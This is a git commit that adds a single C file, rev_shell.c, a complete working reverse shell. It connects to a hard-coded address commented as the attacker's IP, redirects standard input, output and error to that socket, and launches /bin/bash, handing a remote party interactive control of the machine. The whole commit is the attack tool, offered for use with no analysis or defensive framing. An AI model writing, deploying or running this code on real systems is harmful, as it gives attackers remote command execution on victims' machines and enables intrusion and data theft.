66163d6700a361d02e3b873b2314a4c586fc4678
akkiboeing <41015771+akkiboeing@users.noreply.github.com>
2019-06-08 16:54:26 +0530

    Add files via upload

---
+++ rev_shell.c
@@ -0,0 +1,29 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+int main()
+{
+        int sockt,port = 3456; //enter any free port of your choice here
+        struct sockaddr_in revsockaddr;
+
+        sockt = socket(AF_INET, SOCK_STREAM,0);
+        revsockaddr.sin_family = AF_INET;       
+        revsockaddr.sin_port = htons(port);
+        revsockaddr.sin_addr.s_addr = inet_addr("192.168.1.105"); //attacker's IP here
+
+        connect(sockt, (struct sockaddr *) &revsockaddr, 
+        sizeof(revsockaddr));
+        dup2(sockt, 0);
+        dup2(sockt, 1);
+        dup2(sockt, 2);
+
+        char * const argv[] = {"/bin/bash", NULL}; 
+        execve("/bin/bash", argv, NULL);
+
+        return 0;
+}
